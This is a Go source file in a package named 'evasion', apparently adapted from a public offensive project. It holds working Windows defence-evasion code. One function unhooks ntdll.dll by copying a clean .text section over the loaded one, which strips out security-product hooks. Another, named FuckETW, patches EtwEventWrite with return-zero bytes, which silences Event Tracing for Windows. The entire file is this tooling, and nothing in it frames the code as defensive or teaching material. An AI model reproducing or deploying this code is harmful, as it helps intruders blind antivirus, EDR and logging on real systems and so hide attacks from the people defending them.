package evasion

// code rewrited from https://github.com/AiGptCode/No-Logs-No-Crime-Fuck-Etw/blob/main/Fuck-ETW-Pyrhon.py
import (
	"fmt"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	NtdllPath = "C:\\Windows\\System32\\ntdll.dll"
)

const (
	SEC_IMAGE = 0x1000000
)

type IMAGE_DOS_HEADER struct {
	E_magic    uint16
	E_cblp     uint16
	E_cp       uint16
	E_crlc     uint16
	E_cparhdr  uint16
	E_minalloc uint16
	E_maxalloc uint16
	E_ss       uint16
	E_sp       uint16
	E_csum     uint16
	E_ip       uint16
	E_cs       uint16
	E_lfarlc   uint16
	E_ovno     uint16
	E_res      [4]uint16
	E_oemid    uint16
	E_oeminfo  uint16
	E_res2     [10]uint16
	E_lfanew   int32
}

type IMAGE_NT_HEADERS struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER64
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size           uint32
}

type IMAGE_SECTION_HEADER struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

func UnhookNTDLL(hNtdll windows.Handle, pMapping uintptr) error {
	var oldProtect uint32
	var pidh *IMAGE_DOS_HEADER
	var pinh *IMAGE_NT_HEADERS

	pidh = (*IMAGE_DOS_HEADER)(unsafe.Pointer(pMapping))
	pinh = (*IMAGE_NT_HEADERS)(unsafe.Pointer(uintptr(pMapping) + uintptr(pidh.E_lfanew)))

	var sectionOffset uintptr = uintptr(unsafe.Sizeof(IMAGE_NT_HEADERS{})) + uintptr(pidh.E_lfanew)

	for i := 0; i < int(pinh.FileHeader.NumberOfSections); i++ {
		pish := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(uintptr(pMapping) + sectionOffset))

		sectionName := strings.TrimRight(string(pish.Name[:]), "\x00")
		fmt.Printf("Section %d: %s\n", i, sectionName)

		if sectionName == ".text" {
			fmt.Println("Found .text section")

			// Prepare ntdll.dll memory region for write permissions.
			err := windows.VirtualProtect(
				uintptr(hNtdll)+uintptr(pish.VirtualAddress),
				uintptr(pish.VirtualSize),
				windows.PAGE_EXECUTE_READWRITE,
				&oldProtect,
			)
			if err != nil {
				fmt.Printf("VirtualProtect for write permissions failed: %v\n", err)
				return err
			}
			fmt.Println("VirtualProtect succeeded")

			// Copy original .text section into ntdll memory
			copyMemory(
				uintptr(hNtdll)+uintptr(pish.VirtualAddress),
				pMapping+uintptr(pish.VirtualAddress),
				uintptr(pish.VirtualSize),
			)
			fmt.Println("CopyMemory succeeded")

			// Restore original protection settings of ntdll
			err = windows.VirtualProtect(
				uintptr(hNtdll)+uintptr(pish.VirtualAddress),
				uintptr(pish.VirtualSize),
				oldProtect,
				&oldProtect,
			)
			if err != nil {
				fmt.Printf("Restoring VirtualProtect failed: %v\n", err)
				return err
			}
			fmt.Println("Restoring VirtualProtect succeeded")
			return nil
		}
		sectionOffset += unsafe.Sizeof(IMAGE_SECTION_HEADER{})
	}
	return fmt.Errorf("Failed to find .text section")
}

func copyMemory(dest, src uintptr, length uintptr) {
	for i := uintptr(0); i < length; i++ {
		*(*byte)(unsafe.Pointer(dest + i)) = *(*byte)(unsafe.Pointer(src + i))
	}
}

func flushInstructionCache(process windows.Handle, baseAddress uintptr, size uintptr) error {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	procFlushInstructionCache := kernel32.NewProc("FlushInstructionCache")
	r1, _, e1 := procFlushInstructionCache.Call(
		uintptr(process),
		baseAddress,
		size,
	)
	if r1 == 0 {
		return e1
	}
	return nil
}

func FuckETW() error {
	var oldProtect uint32

	mod, err := windows.LoadLibrary("ntdll.dll")
	if err != nil {
		return err
	}

	pEventWrite, err := windows.GetProcAddress(mod, "EtwEventWrite")
	if err != nil {
		return err
	}

	err = windows.VirtualProtect(pEventWrite, 4096, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return err
	}

	// Write the assembly code to xor rax, rax; ret on 64-bit or xor eax, eax; ret 14 on 32-bit
	var code []byte
	isWow64 := false
	handle, err := windows.GetCurrentProcess()
	if err != nil {
		return err
	}
	err = windows.IsWow64Process(handle, &isWow64)
	if err != nil {
		return err
	}
	if isWow64 {
		code = []byte{0x33, 0xC0, 0xC2, 0x14, 0x00}
	} else {
		code = []byte{0x48, 0x33, 0xC0, 0xC3}
	}
	copyMemory(uintptr(unsafe.Pointer(pEventWrite)), uintptr(unsafe.Pointer(&code[0])), uintptr(len(code)))

	err = windows.VirtualProtect(pEventWrite, 4096, oldProtect, &oldProtect)
	if err != nil {
		return err
	}

	err = flushInstructionCache(handle, pEventWrite, 4096)
	if err != nil {
		return err
	}

	return nil
}
